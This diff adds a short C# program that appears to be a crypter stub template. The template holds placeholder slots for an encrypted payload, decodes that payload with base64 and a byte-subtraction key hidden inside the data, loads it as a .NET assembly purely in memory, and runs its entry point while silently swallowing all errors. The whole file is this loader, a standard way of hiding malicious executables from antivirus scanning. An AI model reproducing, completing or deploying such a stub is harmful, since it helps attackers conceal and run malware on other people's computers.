@@ -1,0 +1,77 @@
+using System;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+using System.Reflection;
+using System.Diagnostics;
+using System.Resources;
+class Program
+{
+    public delegate void LoadRes();
+    public delegate void LoadAsm();
+    public delegate void RunAsm();
+    static string[] parts = new string[] { "[PART1]", "[PART2]" };
+    static int Main(string[] args)
+    {
+        try
+        {
+            byte[] bData = null;
+           // Stream str = null;
+            Assembly asm = null;
+            LoadRes loadRes = delegate()
+            {
+                string com = "";
+                for (int i = 0; i < parts.Length; i++)
+                {
+                    com += parts[i];
+                }
+                bData = Decrypt(Encoding.GetEncoding(1252).GetBytes(com), true);
+                //str = Assembly.GetExecutingAssembly().GetManifestResourceStream("[RES_NAME]");
+                //bData = new byte[str.Length];
+                //str.Read(bData, 0, bData.Length);
+                //bData = Decrypt(bData, false);
+                //str.Close();
+            };
+            loadRes();
+
+            LoadAsm loadAsm = delegate()
+            {
+                asm = Assembly.Load(bData);
+            };
+            loadAsm();
+
+            RunAsm runAsm = delegate()
+            {
+                MethodInfo info = asm.EntryPoint;
+                object o = asm.CreateInstance(info.Name);
+                info.Invoke(o, null);
+            };
+            runAsm();
+
+            Process.GetCurrentProcess().WaitForExit();
+        }
+        catch
+        {
+        }
+        return 0;
+    }
+    public static byte[] Decrypt(byte[] data, bool base64)
+    {
+        try
+        {
+            List<byte> bytes = new List<byte>(base64 ? Convert.FromBase64String(Encoding.ASCII.GetString(data)) : data);
+            int key = (int)BitConverter.ToInt32(bytes.GetRange((bytes.Count - 4) / 2, 4).ToArray(), 0);
+            bytes.RemoveRange((bytes.Count - 4) / 2, 4);
+            for (int i = 0; i < bytes.Count; i++)
+            {
+                bytes[i] = bytes[i] -= (byte)key;
+            }
+            byte[] done = bytes.ToArray();
+            bytes.Clear();
+            bytes = null;
+            return done;
+        }
+        catch { }
+        return null;
+    }
+}
